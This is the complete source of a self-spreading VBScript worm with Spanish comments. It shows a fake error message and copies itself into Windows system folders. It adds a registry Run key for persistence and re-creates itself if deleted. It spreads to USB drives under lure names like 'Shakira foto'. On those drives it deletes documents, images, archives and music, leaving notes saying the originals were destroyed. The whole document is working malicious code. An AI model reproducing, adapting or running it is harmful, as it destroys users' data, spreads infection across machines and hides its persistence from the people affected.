REM Autor YO/ PAIS:ARGENTINA/ PROVINCIA:NEUQUEN /LOCALIDAD : NEUQUEN CAPITAL
On error resume Next
If Day(Now()) = 4 Then MsgBox "Un dia como Hoy Murio FuenteAlba JUSTICIA YA. JUICIO Y CASTIGO A LOS CULPABLES!",VBCRITICAL, "YO"
Msgbox "Archivo no Reconocido Instale el Software Adecuado", vbcritical, "Windows"
dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set kk = WScript.CreateObject("WScript.Shell")
kk.RegDelete "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\"
kk.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\",Inicio & "shimgvw.dll,3"
kk.RegDelete "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon\"
kk.RegWrite "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon\","%SystemRoot%\regedit.exe,1"  
Set Carp = CreateObject("Scripting.FileSystemObject")
Set w = Carp.GetSpecialFolder (0)
Set s = Carp.GetSpecialFolder (1)
Set t = Carp.GetSpecialFolder (2)
Set Dual = Fso.GetFile(WScript.ScriptFullName)
If (Fso.FileExists(s & "\VBSSYS.vbs") ) = False Then
Set God = CreateObject("Scripting.FileSystemObject")
God.CopyFile Dual,(s & "\VBSSYS.vbs")
God.CopyFile Dual, (W & "\VBSSOS.vbs")
God.CopyFile Dual, "C:\Windows.vbs"
God.CopyFile Dual, (t & "\LA H.vbs")
kk.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\windows",(s & "\VBSSyS.vbs")            
Set fso = CreateObject("Scripting.FileSystemObject")
Else LISTADRIb
FORRO
End if
Sub FORRO
On error resume Next
Set ws = CreateObject("WScript.Shell")
Set MiFile= Fso.OpenTextFile(WScript.ScriptFullname, 1)
Payload= MiFile.readall
MiFile.Close
DO
i = i +1
If i = 1000000 Then
Set PUFF = CreateObject("WScript.Shell")
X = PUFF.regRead ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\windows",(s & "\VBSSyS.vbs"))
If X = 0 Then
PUFF.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\windows",(s & "\VBSSyS.vbs")
End if
If Not (Fso.fileexists(wscript.scriptfullname)) Then
Set newfile= Fso.createtextfile(wscript.scriptfullname, True)
newfile.write Payload
newfile.Close
End if
Set fso = CreateObject("Scripting.FileSystemObject")
Dim la,lo 
Set lo = fso.Drives 
For Each la in lo
' 0: "Unknown" ' 1: "Removable" ' 2: "Fixed" ' 3: "Network"
' 4: "CD-ROM" ' 5: "RAM Disk" 
If la.DriveType = 1 Then
Set Dual = Fso.GetFile(WScript.ScriptFullName)
Set zonavirus = CreateObject("Scripting.FileSystemObject")
Randomize
kuasa = Int(Rnd * 3)
If kuasa = "0" Then Nombre = "MI FOTO"
If kuasa = "1" Then Nombre = "Shakira foto"
If kuasa = "2" Then Nombre = "Maradona Foto"
zonavirus.CopyFile Dual, la & Nombre & ".vbs"
End if
i = 0
next
End if
loop                
End Sub
Sub LISTADRIb
On Error Resume Next
Dim la,lo 
Set lo = fso.Drives 
For Each la in lo
' 0: "Unknown" ' 1: "Removable" ' 2: "Fixed" ' 3: "Network"
' 4: "CD-ROM" ' 5: "RAM Disk" 
If la.DriveType = 1 Then
LISTACARP(la.path&"\") 
end if 
Next 
end sub 
Sub LISTACARP(folderspec) 
On Error Resume Next 
dim yo,ya,yi
set yo = fso.GetFolder(folderspec)  
set yi = yo.SubFolders 
for each ya in yi
BORRAR(ya.path)
LISTACARP(ya.path)
next
end sub  
sub BORRAR(folderspec) 
On error resume next
dim p,p1,pc,exti,so,Go
CopiaTotal = File.ReadAll                                         
set p = fso.GetFolder(folderspec)
set pc = p.Files
for each p1 in pc
exti=fso.GetExtensionName(p1.path)
exti=lcase(exti)          
so=lcase(p1.name)
if exti="jpeg" or exti="jpg" or exti="xls" or exti="zip" or exti="bmp" or exti="doc" or exti="mp3" or exti="wma"  Then
bname=fso.GetBaseName(p1.path)            
Set CHIS = CreateObject("Scripting.FileSystemObject")
Set ESCRI = CHIS.CreateTextFile (folderspec & "\" & bname & ".txt")        
ESCRI.WriteLine "-------------------------------------"
ESCRI.WriteLine "YO"
ESCRI.WriteLine "LOS ARCHIVOS ORIGINALES FUERON DESTRUIDOS"
ESCRI.WriteLine "-------------------------------------"
ESCRI.Close
fso.DeleteFile (p1.path)
End If
Next
End Sub



                 

 